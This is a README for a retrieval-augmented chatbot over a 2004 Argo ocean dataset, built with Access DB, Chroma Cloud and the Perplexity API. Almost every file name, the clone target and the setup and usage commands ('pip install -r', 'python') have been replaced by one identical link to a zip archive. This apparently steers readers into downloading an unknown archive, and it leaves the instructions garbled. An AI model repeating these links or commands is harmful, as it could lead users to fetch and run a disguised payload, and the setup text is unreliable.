# 🌊 Argo RAG Bot

This project implements a **Retrieval-Augmented Generation (RAG)** pipeline using:
- **Microsoft Access DB** (2004 Argo Dataset)
- **LangChain + Chroma Cloud** (Vector database for retrieval)
- **HuggingFace Embeddings**
- **Perplexity API** (SONAR PRO) for LLM answers

---

## 🚀 Features
- Extract data from `.accdb` database (`https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip`)
- Convert tables to JSON format for processing
- Chunk & upload documents to **Chroma Cloud** (`https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip`)
- Query documents using **RAG + Perplexity API** (`https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip`)
- Supports resumable uploads with checkpoints

---

## 📂 Project Structure
argo_rag/
│── data/ # Source Access DB file
│ └── https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip
│── output/ # Generated JSON + checkpoints
│── src/
│ ├── https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip # Upload docs to Chroma
│ ├── https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip # Extract from Access DB
│ ├── https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip # Query interface
│ └── https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip # Common config/paths
│── .env # API keys + config (not committed)
│── https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip
│── https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip
│── .gitignore


---

## ⚙️ Setup

1. Clone the repo:
   ```bash
   git clone https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip<your-username>https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip
   cd floatchat-backend/argo_rag

2. Create virtual environment:

python -m venv venv
source venv/bin/activate   # (Linux/Mac)
venv\Scripts\activate      # (Windows)

3. Install dependencies:

pip install -r https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip


4. Add your .env file:

CHROMA_API_KEY=your_chroma_api_key
CHROMA_TENANT=your_chroma_tenant
CHROMA_DATABASE=your_chroma_db
PERPLEXITY_API_KEY=your_perplexity_api_key
PERPLEXITY_MODEL=sonar-pro

5. 🛠 Usage

1. Extract Data
python https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip

2. Build & Upload Chroma Index
python https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip

3. Query with RAG
python https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip


6. Type your questions interactively:

Ask a question (or type 'exit'): What was the average salinity in the Indian Ocean in 2004?

10. 📝 Notes

Default chunk size: 300 tokens

Batch size: 50 (safe for Chroma Cloud free tier)

If uploads fail, adjust BATCH_SIZE or request quota increase.